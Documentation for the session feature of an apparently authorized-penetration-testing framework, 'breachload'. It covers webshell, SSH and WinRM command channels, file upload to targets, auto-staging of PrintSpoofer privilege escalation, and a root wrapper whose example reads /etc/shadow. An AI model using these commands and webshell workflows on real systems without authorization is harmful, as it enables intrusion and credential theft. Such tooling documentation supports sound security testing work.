# Sessions

A `Session` is breachload's abstraction for a command channel to a host
you've already compromised. Once registered, every post-exploitation feature
(loot, privesc, upload, lateral) drives the same handle — so you don't
paste creds ten times.

## Three kinds

### WebshellSession

A URL template with a `FUZZ` marker where the (URL-encoded) command goes.

```bash
breachload session <cfg> --webshell 'http://target/uploads/shell.php?cmd=FUZZ'
```

Under the hood it fires `curl -s --max-time 30 <URL with FUZZ replaced>`.
Argv-only: your command is URL-encoded, so shell metacharacters are safe
even against a raw exec shell.

### SshSession

`user:password@host[:port]`. Uses `sshpass` when password is given, or
`-i <key>` when a key path is set.

```bash
breachload session <cfg> --ssh 'operator:R7qZ9L3xKM2W8pFYcA@10.129.245.123'
```

### WinrmSession

`user:password@host[:port]` — port defaults to 5985. Uses `evil-winrm -c`
for one-shot command execution.

```bash
breachload session <cfg> --winrm 'admin:Winter2025!@10.10.11.5'
```

## Test it

```bash
breachload session <cfg> --test
# runs `id` (or `whoami` for winrm) through the session
```

## Uploading a file

Sessions have a `.upload(local, remote)` method used by
`_autonomous_privesc_windows` (and callable from your own code):

- **WebshellSession** — base64-chunks the local file into the target with
  `printf` + `base64 -d`. Works over any shell channel.
- **SshSession** — native `scp` first, falls back to the base64 channel on
  scp failure.
- **WinrmSession** — writes with PowerShell `[IO.File]::WriteAllBytes`
  after `Add-Content` in chunks.

## Auto-staging privesc helpers

In `auto-exploit` mode the Windows escalation `attempt_win_escalation` auto-
uploads its helper binaries (PrintSpoofer, MSI) before firing the vector,
using paths from `config.tool_paths` in the engagement YAML:

```yaml
tool_paths:
  printspoofer: /opt/PrintSpoofer.exe
  shell_msi: /opt/shell.msi
```

Without a configured path, the escalation assumes the helper is already on
the target (best effort) and lets the run decide.

## Root sessions

When `_autonomous_privesc` (Linux) or `_autonomous_privesc_windows` proves
escalation, it upgrades the session to a `RootSession` — a wrapper that
prefixes every command with the vector's root-run template:

```python
# For sudo NOPASSWD scriptable-bin (bash):
template = "sudo bash -c '{CMD}'"

root.run("cat /etc/shadow")
# -> the base session runs: sudo bash -c 'cat /etc/shadow'
```

So you keep the same handle for post-root operations.

## Persistence

Sessions are stored at `engagements/<name>/session.json` — a plain JSON
serialization of the session's `to_dict()`. `auto-exploit` auto-loads it on
start.

## Scope-checked

A session's `host` is always checked against the engagement scope before
any command runs. Out-of-scope hosts are hard-refused; there's no way to
run a command through a session on a host you didn't authorize.
